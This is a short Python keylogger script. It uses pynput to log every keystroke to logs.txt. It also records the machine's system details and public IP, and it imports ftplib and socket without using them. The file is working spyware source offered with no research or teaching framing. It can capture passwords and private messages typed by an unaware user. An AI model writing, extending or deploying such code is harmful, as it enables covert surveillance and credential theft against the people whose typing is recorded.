import socket
import platform
from pynput.keyboard import Key, Listener
import ftplib
import logging
import subprocess
from urllib.request import urlopen


logdir = ""
logging.basicConfig(filename=logdir+"logs.txt",level=logging.DEBUG,format="%(asctime)s:%(message)s")


def pressing_key(key):
	try:
		logging.info(str(key))
	except AttributeError:
		print(f"A special key {key} has been pressed")


def releasing_key(key):
	if key == Key.f9:
		return False


def internet_on():
	try:
		response = urlopen('https://www.google.com', timeout=20)
		return True
	except:
		pass
	return False


def sysinfo():
	return platform.uname()


def getpublicip():
	try:
		return str((urlopen('http://ip.42.pl/raw').read())).replace("b","")
	except:
		pass


with open('logs.txt', 'a') as f:
	f.write(str(sysinfo())+"\n")
	if internet_on():
		f.write("IP Address is:"+getpublicip()+"\n")

subprocess.call(["clear"])

print("Started Listening...\n")

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
	listener.join()


